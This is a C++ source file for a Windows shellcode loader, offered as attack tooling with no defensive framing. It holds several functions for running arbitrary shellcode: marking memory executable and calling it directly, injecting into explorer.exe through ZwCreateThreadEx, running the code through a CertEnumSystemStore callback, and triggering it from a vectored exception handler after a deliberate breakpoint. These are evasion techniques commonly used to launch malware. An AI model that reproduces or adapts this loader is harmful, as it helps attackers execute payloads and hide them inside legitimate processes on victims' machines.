#include "Loader.h"
#include "CodeInject.h"
#include "Utils.h"

#pragma comment(lib,"Crypt32.lib")

/////////////////直接加载///////////////////

void Loader::RunShellCode_1(unsigned char *buffer)
{
	DWORD OldProtect = 0;
	PVOID pBuffer = NULL;
	pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
	if (pBuffer == NULL)
	{
		return;
	}
	if (!VirtualProtect(pBuffer, 0x1000, PAGE_EXECUTE_READWRITE, &OldProtect))
	{
		printf("%d\n", GetLastError());
	}
	memcpy(pBuffer, buffer, 0x1000);

	((void(*)(void))pBuffer)();

}

void Loader::RunShellCode_2(unsigned char* buffer)
{
	DWORD OldProtect = 0;
	VirtualProtect(buffer, 0x1000, PAGE_EXECUTE_READWRITE, &OldProtect);
	((void(*)(void))buffer)();
}


////////////////////////////注入式加载///////////////////////////////

void Loader::InjectShellCode_1(unsigned char* buffer)
{
	CodeBuffer Buffer = { 0 };
	Buffer.BufferSize = 0x1000;
	Buffer.pBuffer = (PBYTE)0x1000;
	//ChangePageProtect(Buffer);
	DWORD dwPid = 0;
	while (!dwPid)
	{
		dwPid = GetProcessIdByProcessName("explorer.exe");
		//dwPid = GetProcessIdByProcessName(L"LogonUI.exe");
		Sleep(10);
	}
	CodeInject::ZwCreateThreadExCodeInject(dwPid, Buffer);
}


void Loader::CertEnumSystemStoreCallbackRunShellcode(unsigned char* buffer)
{
	DWORD OldProtect = 0;
	VirtualProtect(buffer, 0x1000, PAGE_EXECUTE_READWRITE, &OldProtect);
	CertEnumSystemStore(0x10000u, 0, (void*)"abcdefg", (PFN_CERT_ENUM_SYSTEM_STORE)buffer);
}

// ////////////////////VEH////////////////////////////////
unsigned char* ptrshellcode = 0;

LONG NTAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
#ifdef _WIN64
	ExceptionInfo->ContextRecord->Rip += 1;
#else
	ExceptionInfo->ContextRecord->Eip += 1;
#endif
	Loader::RunShellCode_2(ptrshellcode);
	//Loader::InjectShellCode_1();
	//Loader::CertEnumSystemStoreCallbackRunShellcode(ptrshellcode);
	return EXCEPTION_CONTINUE_SEARCH;
}

void Loader::VehRunShellcode(unsigned char* buffer)
{
	ptrshellcode = buffer;
	AddVectoredExceptionHandler(1, ExceptionHandler);
	__debugbreak();
}

